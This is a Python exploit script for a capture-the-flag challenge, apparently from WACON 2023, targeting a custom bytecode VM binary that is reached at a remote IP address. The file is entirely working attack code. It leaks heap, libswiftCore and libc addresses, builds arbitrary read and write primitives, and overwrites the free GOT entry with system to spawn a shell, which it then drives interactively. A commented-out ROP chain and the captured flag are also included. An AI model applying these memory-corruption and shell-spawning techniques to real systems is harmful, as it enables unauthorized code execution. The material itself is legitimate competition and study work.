#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './app'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'localhost', 'port':40000}, \
                        remote  = {'host':'58.229.185.52', 'port':40000})
env.select()

#==========

binf = ELF(bin_file)

libc = ELF('./libc.so.6')
ofs_libc_free         = libc.sep_function['free']

libswiftcore = ELF('./libswiftCore.so')

#==========

def attack(conn, **kwargs):
    d = Dead(conn)

    conn.recvuntil(':> ')

    d.push_imm(0xff)
    d.cmp_imm_eq(0, 0)
    d.jmp(0)

    for _ in range(6):
        d.push_imm(0x0)

    d.init_heapreg(0)
    d.pop_reg(0)

    d.add_imm(1, 0x60)
    d.add_reg(1, 0)
    d.push_reg(1)

    d.print_regs()
    d.send_code()

    conn.recvuntil(b'rax: ')
    addr_heap = int(conn.recvline(), 16)
    info('addr_heap              = 0x{:08x}'.format(addr_heap))

    conn.recvuntil(b'r8: ')
    addr_ss17FixedWidthIntegerMp = int(conn.recvline(), 16)
    libswiftcore.address = addr_ss17FixedWidthIntegerMp - 0x570eb4
    info('addr_swiftcore_base    = 0x{:08x}'.format(libswiftcore.address))
    addr_swift_got_free       = libswiftcore.got['free']


    def aar(addr):
        d.push_imm(0xff)
        d.cmp_imm_eq(0, 0)
        d.jmp(0)

        for _ in range(5):
            d.push_imm(0x0)

        d.mov_imm_over(0, addr)
        d.push_reg(0)
        d.print_regs()
        d.send_code()

        conn.recvuntil(b'r8: ')
        return conn.recvline()

    def aaw(addr, data):
        d.push_imm(0xff)
        d.cmp_imm_eq(0, 0)
        d.jmp(0)

        for _ in range(14):
            d.push_imm(0x0)

        d.mov_imm_over(0, addr - 0x112*8)
        d.push_reg(0)

        prev = p64(0)
        for r in split_n(data, 8):
            if r != prev:
                d.mov_imm_over(1, u64(r))
                prev = r
            d.push_reg(1)

        d.send_code()

    addr_libc_free = int(aar(addr_swift_got_free), 16)
    libc.address = addr_libc_free - ofs_libc_free
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_environ    = libc.symbols['environ']
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    aaw(addr_swift_got_free, p64(addr_libc_system))
    conn.sendline('sh')

    '''
    addr_stack = int(aar(addr_libc_environ), 16)
    info('addr_stack    = 0x{:08x}'.format(addr_stack))

    rop = ROP(libc)
    for _ in range(7):
        rop.call(rop.ret.address)
    rop.system(addr_libc_str_sh)
    rop.exit(0)

    aaw(addr_stack-0x1b0, bytes(rop))
    '''

class Dead:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter
        self.code = b''

    def encode(self, code):
        ret = b''
        for c in code:
            for i in [2,3,0,1]:
                ret += b'dead' if c>>i & 1 == 1 else b'1337'
        return ret

    def mov_reg(self, dst, src):
        self.code += self.encode([0x1, dst, src])

    def mov_imm(self, dst, imm):
        self.sub_reg(dst, dst)
        self.add_imm(dst, imm)

    def mov_imm_over(self, dst, imm):
        self.sub_reg(dst, dst)

        for i in range(7, -1, -1):
            if (imm >> (i*8)) != 0:
                for _ in range(8):
                    self.add_reg(dst, dst)
            x = (imm >> (i*8)) & 0xff
            if x == 0:
                continue
            self.add_imm(dst, x)

    def get(self, src):
        self.code += self.encode([0x2, src])

    def add_imm(self, dst, imm):
        self.code += self.encode([0x3, dst])
        self.code += b'1337'*2
        self.code += self.encode([(imm & 0xf0) >> 4, imm & 0xf])

    def add_imm_over(self, dst, imm):
        for _ in range(imm//0xff):
            self.add_imm(dst, 0xff)
        self.add_imm(dst, imm-(imm//0xff)*0xff)

    def add_reg(self, dst, src):
        self.code += self.encode([0x4, dst, src])

    def sub_imm(self, dst, imm):
        self.code += self.encode([0x5, dst])
        self.code += b'1337'*2
        self.code += self.encode([(imm & 0xf0) >> 4, imm & 0xf])

    def sub_reg(self, dst, src):
        self.code += self.encode([0x6, dst, src])

    def push_reg(self, src):
        self.code += self.encode([0x7, src])

    def push_imm(self, imm):
        self.code += self.encode([0x8])
        self.code += b'1337'*2
        self.code += self.encode([(imm & 0xf0) >> 4, imm & 0xf])

    def pop_reg(self, dst):
        self.code += self.encode([0x9, dst])

    def init_heapreg(self, nreg):
        self.code += self.encode([0xa, nreg])

    def write_heapreg(self, nreg, imm):
        self.code += self.encode([0xb, nreg])
        self.code += b'1337'*2
        self.code += self.encode([(imm & 0xf0) >> 4, imm & 0xf])

    def read_heapreg(self, nreg):
        self.code += self.encode([0xc, nreg])

    def cmp_imm_eq(self, dst, imm):
        self.code += self.encode([0xd, 0, dst])
        self.code += b'1337'*1
        self.code += self.encode([(imm & 0xf0) >> 4, imm & 0xf])

    def cmp_imm_neq(self, dst, imm):
        self.code += self.encode([0xd, 1, dst])
        self.code += b'1337'*1
        self.code += self.encode([(imm & 0xf0) >> 4, imm & 0xf])

    def cmp_imm_lt(self, dst, imm):
        self.code += self.encode([0xd, 2, dst])
        self.code += b'1337'*1
        self.code += self.encode([(imm & 0xf0) >> 4, imm & 0xf])

    def cmp_reg_eq(self, dst, src):
        self.code += self.encode([0xd, 4, dst, src])

    def cmp_reg_neq(self, dst, src):
        self.code += self.encode([0xd, 5, dst, src])

    def jmp(self, imm):
        self.code += self.encode([0xe])
        self.code += b'1337'*2
        self.code += self.encode([(imm & 0xf0) >> 4, imm & 0xf])

    def print_regs(self):
        self.code += self.encode([0xf])

    def send_code(self):
        self.sendline(self.code)
        self.code = b''

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # WACON2023{144d11f7c6876f04f66379b7082476356d70c82b8a39547d03dbe35ece52bc6c}

if __name__=='__main__':
    main()

#==========
